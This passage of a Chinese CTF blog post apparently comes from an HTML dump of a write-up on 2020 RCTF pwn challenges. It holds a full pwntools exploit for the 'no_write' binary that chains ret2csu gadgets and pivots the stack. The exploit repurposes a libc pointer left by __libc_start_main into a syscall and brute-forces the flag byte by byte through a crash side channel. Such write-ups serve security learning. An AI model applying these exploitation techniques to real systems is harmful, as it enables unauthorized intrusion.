class="string">"dd"</span>+<span class="string">"d"</span>*<span class="number">7</span>+j)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line">p.send(<span class="string">"A"</span>*<span class="number">0x100</span>)</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>同样是一道非常有趣的题目，学到pwn中的一些盲注思路，和SQL注入类似都有基于报错的和基于延时的方法。以及利用<code>__libc_start_main</code>让libc地址出现在栈空间上，再利用gadget修改成我们想要的gadget完成整体的利用。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret_csu</span><span class="params">(func,arg1=<span class="number">0</span>,arg2=<span class="number">0</span>,arg3=<span class="number">0</span>)</span>:</span></span><br><span class="line">    payload = <span class="string">''</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(func)</span><br><span class="line">    payload += p64(arg1)+p64(arg2)+p64(arg3)+p64(<span class="number">0x000000000400750</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(host,port=<span class="number">2333</span>)</span>:</span></span><br><span class="line">    <span class="comment"># global p</span></span><br><span class="line">    <span class="comment"># if host:</span></span><br><span class="line">        <span class="comment"># p = remote(host,port)</span></span><br><span class="line">    <span class="comment"># else:</span></span><br><span class="line">        <span class="comment"># p = process("./no_write")</span></span><br><span class="line">        <span class="comment"># gdb.attach(p,"b* 0x0000000004006E6")</span></span><br><span class="line">    <span class="comment"># 0x0000000000400773 : pop rdi ; ret</span></span><br><span class="line">    <span class="comment"># 0x0000000000400771 : pop rsi ; pop r15 ; ret</span></span><br><span class="line">    <span class="comment"># .text:0000000000400544                 call    cs:__libc_start_main_ptr</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># .text:00000000004005E8                 add     [rbp-3Dh], ebx</span></span><br><span class="line">    <span class="comment"># .text:00000000004005EB                 nop     dword ptr [rax+rax+00h]</span></span><br><span class="line">    <span class="comment"># .text:00000000004005F0                 rep retn</span></span><br><span class="line">    charset = <span class="string">'&#125;&#123;_'</span>+string.digits+string.letters</span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x30</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># p = remote(host,6000)</span></span><br><span class="line">                p = process(<span class="string">'./no_write'</span>)</span><br><span class="line">                pppppp_ret = <span class="number">0x00000000040076A</span></span><br><span class="line">                read_got = <span class="number">0x000000000600FD8</span></span><br><span class="line">                call_libc_start_main = <span class="number">0x000000000400544</span></span><br><span class="line">                p_rdi = <span class="number">0x0000000000400773</span></span><br><span class="line">                p_rsi_r15 = <span class="number">0x0000000000400771</span></span><br><span class="line">                <span class="comment"># 03:0018|  0x601318 -&gt; 0x7f6352629d80 (initial) &lt;-0x0</span></span><br><span class="line">                offset = <span class="number">0x267870</span> <span class="comment">#initial - __strncmp_sse42</span></span><br><span class="line">                readn = <span class="number">0x0000000004006BF</span></span><br><span class="line">                leave_tet = <span class="number">0x00000000040070B</span></span><br><span class="line">                payload = <span class="string">"A"</span>*<span class="number">0x18</span>+p64(pppppp_ret)+ret_csu(read_got,<span class="number">0</span>,<span class="number">0x601350</span>,<span class="number">0x400</span>)  </span><br><span class="line">                payload += p64(<span class="number">0</span>)+p64(<span class="number">0x6013f8</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(leave_tet)  <span class="comment"># move stack to 0x601400</span></span><br><span class="line">                payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)</span><br><span class="line">                p.send(payload)</span><br><span class="line">                sleep(<span class="number">0.3</span>)</span><br><span class="line">                payload = <span class="string">"\x00"</span>*(<span class="number">0x100</span><span class="number">-0x50</span>)  <span class="comment"># 0x601400</span></span><br><span class="line">                payload += p64(p_rdi)+p64(readn)+p64(call_libc_start_main)  <span class="comment"># also has rsi=0x601350 rdx=0x400</span></span><br><span class="line">                payload = payload.ljust(<span class="number">0x400</span>,<span class="string">'\x00'</span>)</span><br><span class="line">                <span class="comment"># pause()</span></span><br><span class="line">                p.send(payload)</span><br><span class="line">                <span class="comment"># pause()</span></span><br><span class="line">                sleep(<span class="number">0.3</span>)</span><br><span class="line">                <span class="comment"># 0x601318</span></span><br><span class="line">                payload = p64(pppppp_ret)+p64((<span class="number">0x100000000</span>-offset)&amp;<span class="number">0xffffffff</span>)  </span><br><span class="line">                payload += p64(<span class="number">0x601318</span>+<span class="number">0x3D</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x4005E8</span>)  <span class="comment"># add [rbp-3Dh], ebx</span></span><br><span class="line">                <span class="comment"># 0x00000000000d2975: syscall; ret;</span></span><br><span class="line">                <span class="comment"># 02:0010|            0x601310 -&gt; 0x7f61d00d8628 (__exit_funcs_lock) &lt;- 0x0</span></span><br><span class="line">                offset = <span class="number">0x31dcb3</span> <span class="comment"># __exit_funcs_lock - syscall</span></span><br><span class="line">                payload += p64(pppppp_ret)+p64((<span class="number">0x100000000</span>-offset)&amp;<span class="number">0xffffffff</span>)</span><br><span class="line">                payload += p64(<span class="number">0x601310</span>+<span class="number">0x3D</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x4005E8</span>)</span><br><span class="line">                payload += p64(pppppp_ret)+ret_csu(read_got,<span class="number">0</span>,<span class="number">0x601800</span>,<span class="number">2</span>)  <span class="comment"># make rax=2</span></span><br><span class="line">                payload += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">                payload += p64(pppppp_ret)+ret_csu(<span class="number">0x601310</span>,<span class="number">0x601350</span>+<span class="number">0x3f8</span>,<span class="number">0</span>,<span class="number">0</span>) <span class="comment">#open flag</span></span><br><span class="line">                payload += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">                payload += p64(pppppp_ret)+ret_csu(read_got,<span class="number">3</span>,<span class="number">0x601800</span>,<span class="number">0x100</span>)   <span class="comment">#read flag</span></span><br><span class="line">                payload += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">                payload += p64(pppppp_ret)+ret_csu(read_got,<span class="number">0</span>,<span class="number">0x601ff8</span>,<span class="number">8</span>)</span><br><span class="line">                <span class="comment"># now we can cmp the flag one_by_one</span></span><br><span class="line">                payload += p64(<span class="number">0</span>)*<span class="number">6</span> </span><br><span class="line">                payload += p64(pppppp_ret)+ret_csu(<span class="number">0x601318</span>,<span class="number">0x601800</span>+i,<span class="number">0x601fff</span>,<span class="number">2</span>)  <span class="comment"># cmp flag</span></span><br><span class="line">                payload += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">                <span class="comment"># for _ in range(4):</span></span><br><span class="line">                <span class="comment">#     payload += p64(p_rdi)+p64(0x601700)+p64(p_rsi_r15)+p64(0x100)+p64(0)+p64(readn)</span></span><br><span class="line">                payload += p64(p_rdi)+p64(<span class="number">0x601700</span>)+p64(p_rsi_r15)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(readn)</span><br><span class="line"></span><br><span class="line">                payload = payload.ljust(<span class="number">0x3f8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">                payload += <span class="string">"flag\x00\x00\x00\x00"</span></span><br><span class="line">                p.send(payload)</span><br><span class="line">                <span class="comment"># pause()</span></span><br><span class="line">                sleep(<span class="number">0.3</span>)</span><br><span class="line">                p.send(<span class="string">"dd"</span>+<span class="string">"d"</span>*<span class="number">7</span>+j)</span><br><span class="line">                <span class="comment"># pause()</span></span><br><span class="line">                sleep(<span class="number">0.5</span>)</span><br><span class="line">                p.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line">                p.send(<span class="string">"A"</span>*<span class="number">0x100</span>)</span><br><span class="line">                <span class="comment"># pause()</span></span><br><span class="line">                <span class="comment"># info(j)</span></span><br><span class="line">                p.close()</span><br><span class="line">                <span class="comment"># p.interactive()</span></span><br><span class="line">            <span class="keyword">except</span> EOFError:</span><br><span class="line">                flag += j</span><br><span class="line">                info(flag)</span><br><span class="line">                print(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span>(j == <span class="string">'&#125;'</span>):</span><br><span class="line">                    exit()</span><br><span class="line">                p.close()</span><br><span class="line">                <span class="comment"># pause()</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">    main(args[<span class="string">"REMOTE"</span>])</span><br></pre></td></tr></table></figure>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.rois.io/2020/rctf-2020-official-writeup/" target="_blank" rel="noopener">https://blog.rois.io/2020/rctf-2020-official-writeup/</a></p>
+<p><a href="https://www.jianshu.com/p/be6bbc251919" target="_blank" rel="noopener">https://www.jianshu.com/p/be6bbc251919</a></p>
+<p><a href="https://mp.weixin.qq.com/s/Ov5PXoh-gHYYrOCA9TNWGw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Ov5PXoh-gHYYrOCA9TNWGw</a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://hurricane618.me">hurricane618</a>
+            </p><p>原文链接：<a href="http://hurricane618.me/2020/08/01/2020rctf-some-pwn/">http://hurricane618.me/2020/08/01/2020rctf-some-pwn/</a>
+            </p><p>发表日期：<a href="http://hurricane618.me/2020/08/01/2020rctf-some-pwn/">August 1st 2020, 2:29:06 pm</a>
+            </p><p>更新日期：<a href="http://hurricane618.me/2020/08/01/2020rctf-some-pwn/">August 1st 2020, 2:31:30 pm</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2020/01/13/algorithm-course-summary/" title="算法课程总结">
+                    <div class="prevTitle">算法课程总结</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    <div id="disqus_thread"></div>
+    <script>
+        /**
+    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+        
+        var disqus_config = function () {
+        this.page.url = "http://hurricane618.me/2020/08/01/2020rctf-some-pwn/";  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = "2020RCTF 几道pwn题的复现"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        };
+        
+        (function () { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+            s.src = 'https://hurricane618.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:hurricane618@hotmail.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/hurricane618" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="//twitter.com/hurricane_618" class="iconfont-archer twitter" target="_blank" title="twitter"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a> record <a href="http://www.beian.miit.gov.cn">蜀ICP备17007526号</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+    
+    <span id="busuanzi_container_site_uv">已经有 <span id="busuanzi_value_site_uv"></span> 个不明生物光临此地</span>
+    
+    </div>
+    
+</footer>
+
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#note"><span class="toc-number">1.</span> <span class="toc-text">note</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过money的限制"><span class="toc-number">1.1.</span> <span class="toc-text">绕过money的限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chunk-overlap"><span class="toc-number">1.2.</span> <span class="toc-text">chunk overlap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-attack"><span class="toc-number">1.3.</span> <span class="toc-text">fastbin attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bf"><span class="toc-number">2.</span> <span class="toc-text">bf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#泄露stack和libc地址"><span class="toc-number">2.1.</span> <span class="toc-text">泄露stack和libc地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#构造ROP-chain执行read"><span class="toc-number">2.2.</span> <span class="toc-text">构造ROP chain执行read</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#read读入orw获得flag"><span class="toc-number">2.3.</span> <span class="toc-text">read读入orw获得flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结-1"><span class="toc-number">2.4.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#no-write"><span class="toc-number">3.</span> <span class="toc-text">no_write</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#构造read读入rop-chain"><span class="toc-number">3.1.</span> <span class="toc-text">构造read读入rop chain</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-libc-start-main"><span class="toc-number">3.2.</span> <span class="toc-text">利用__libc_start_main</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#逐位爆破flag"><span class="toc-number">3.3.</span> <span class="toc-text">逐位爆破flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结-2"><span class="toc-number">3.4.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">4.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 23
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span><a class="archive-post-title" href="/2020/08/01/2020rctf-some-pwn/">2020RCTF 几道pwn题的复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/13</span><a class="archive-post-title" href="/2020/01/13/algorithm-course-summary/">算法课程总结</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/27</span><a class="archive-post-title" href="/2019/11/27/docker-mysql-problem-check/">Docker中的Mysql配置问题处理与思考</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/11</span><a class="archive-post-title" href="/2019/11/11/cnss-recruit-pwn-1/">CNSS招新题中的一道ROP题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/14</span><a class="archive-post-title" href="/2019/09/14/fancy-rop-practice/">花式栈溢出学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/26</span><a class="archive-post-title" href="/2019/07/26/basic-rop-practice/">基础ROP学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/24</span><a class="archive-post-title" href="/2019/05/24/2019rctf-some-writeup/">2019RCTF 部分Web的WriteUp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/29</span><a class="archive-post-title" href="/2019/04/29/2019ddctf-unsolved-writeup/">2019DDCTF 未解决的web题 writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href="/2019/04/19/2019ddctf-my-solutions-writeup/">2019DDCTF 部分我解决的题目writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/31</span><a class="archive-post-title" href="/2019/03/31/2019TCTF-web-writeup/">2019TCTF web writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/02</span><a class="archive-post-title" href="/2019/03/02/serial-ports-translation-cn/">快速寻找串行接口</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/18</span><a class="archive-post-title" href="/2019/02/18/yingshi-camera-firmware-extract/">萤石某摄像头的安全分析--固件提取</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/03</span><a class="archive-post-title" href="/2019/02/03/thinkphp-5-0-23-rce/">thinkphp 5.0.23 rce分析和复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/27</span><a class="archive-post-title" href="/2019/01/27/haozi-xss-challenges/">haozi xss 挑战赛 writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/24</span><a class="archive-post-title" href="/2019/01/24/code-breaking-lumenserial/">code-breaking lumenserial 复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/10</span><a class="archive-post-title" href="/2019/01/10/code-breaking-esay-wp/">code-breaking easy部分题目writeup</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/15</span><a class="archive-post-title" href="/2018/08/15/google-ctf-beginner-part2/">Google CTF Beginner Part2</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span><a class="archive-post-title" href="/2018/08/01/dianfengjikeCTF-web/">巅峰极客CTF 部分Web复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href="/2018/07/18/google-ctf-beginner-part1/">Google CTF Beginner Part1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/08</span><a class="archive-post-title" href="/2018/07/08/google-ctf-beginner-js-safe-1/">Google CTF Beginner JS Safe 1 复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/01</span><a class="archive-post-title" href="/2018/07/01/phpmyadmin4-8-1-background-LFI/">phpmyadmin4.8.1 后台LFI</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/30</span><a class="archive-post-title" href="/2018/06/30/csp-bypass-summary/">CSP绕过总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/26</span><a class="archive-post-title" href="/2018/06/26/new-start/">新的开始</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="JAVA"><span class="iconfont-archer">&#xe606;</span>JAVA</span>
+    
+        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
+    
+        <span class="sidebar-tag-name" data-tags="ROP"><span class="iconfont-archer">&#xe606;</span>ROP</span>
+    
+        <span class="sidebar-tag-name" data-tags="stackoverflow"><span class="iconfont-archer">&#xe606;</span>stackoverflow</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="docker"><span class="iconfont-archer">&#xe606;</span>docker</span>
+    
+        <span class="sidebar-tag-name" data-tags="Mysql"><span class="iconfont-archer">&#xe606;</span>Mysql</span>
+    
+        <span class="sidebar-tag-name" data-tags="闲聊"><span class="iconfont-archer">&#xe606;</span>闲聊</span>
+    
+        <span class="sidebar-tag-name" data-tags="IOT"><span class="iconfont-archer">&#xe606;</span>IOT</span>
+    
+        <span class="sidebar-tag-name" data-tags="CSP"><span class="iconfont-archer">&#xe606;</span>CSP</span>
+    
+        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
+    
+        <span class="sidebar-tag-name" data-tags="翻译"><span class="iconfont-archer">&#xe606;</span>翻译</span>
+    
+        <span class="sidebar-tag-name" data-tags="heap"><span class="iconfont-archer">&#xe606;</span>heap</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="技术"><span class="iconfont-archer">&#xe60a;</span>技术</span>
+    
+        <span class="sidebar-category-name" data-categories="杂谈"><span class="iconfont-archer">&#xe60a;</span>杂谈</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "hurricane618"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
